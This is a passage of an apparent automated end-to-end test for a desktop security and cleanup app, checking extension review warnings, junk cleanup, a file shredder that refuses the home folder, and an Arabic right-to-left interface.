await page.waitForSelector("#extensions >> text=Coupon Helper");
const extensionText = await page.locator("#extensions").innerText();
assert.match(extensionText, /Review/);
assert.match(extensionText, /not installed from the browser's store/);
step("browser extensions: a sideloaded extension with access to every site is marked for review");

const thumbs = join(home, ".cache", "thumbnails", "large");
await mkdir(thumbs, { recursive: true });
await writeFile(join(thumbs, "old.png"), Buffer.alloc(4096, 1));
const lastWeek = new Date(Date.now() - 7 * 86_400_000);
await utimes(join(thumbs, "old.png"), lastWeek, lastWeek);
await page.click("#junk-measure");
await page.waitForSelector('[data-junk="thumbnails"]');
for (const box of await page.locator("[data-junk]").all()) {
  if ((await box.getAttribute("data-junk")) === "thumbnails") await box.check(); else await box.uncheck();
}
page.once("dialog", (d) => d.accept());
await page.click("#junk-clean");
await page.waitForSelector("text=/Removed 1 files/");
assert.equal(await exists(join(thumbs, "old.png")), false);
step("junk cleanup: junk measured per category; only the chosen category cleaned");

const secret = join(work, "bank-details.txt");
await writeFile(secret, "IBAN DE00 0000 0000 0000");
await app.evaluate(({ dialog }, chosen) => { dialog.showOpenDialog = async () => ({ canceled: false, filePaths: chosen }); }, [home]);
await page.click("#shred-folders");
await page.waitForSelector("#shred-queue >> text=/whole home folder/");
await app.evaluate(({ dialog }, chosen) => { dialog.showOpenDialog = async () => ({ canceled: false, filePaths: chosen }); }, [secret]);
await page.click("#shred-files");
await page.waitForSelector(`#shred-queue >> text="${secret}"`);
page.once("dialog", (d) => d.accept());
await page.click("#shred-go");
await page.waitForSelector("text=1 file shredded.");
assert.equal(await exists(secret), false);
assert.ok(await exists(join(home, ".bashrc")), "the refused home folder is untouched");
assert.match(await page.locator("#blocked-programs").innerText(), /not available on Linux/);
await shot(page, "desktop-tools");
step("file shredder: a chosen file destroyed, the home folder refused; firewall blocking explained on Linux");

await page.click('[data-tab="settings"]');
await page.selectOption("#language", "ar");
await page.waitForSelector("text=الحماية");
assert.equal(await page.evaluate(() => document.documentElement.dir), "rtl");
await page.click('[data-tab="scan"]');
await shot(page, "desktop-arabic");
step("interface switches to Arabic, right to left");

await app.close();
sleeper.kill();
server.close();
vnc.close();
console.log("All desktop checks passed.");
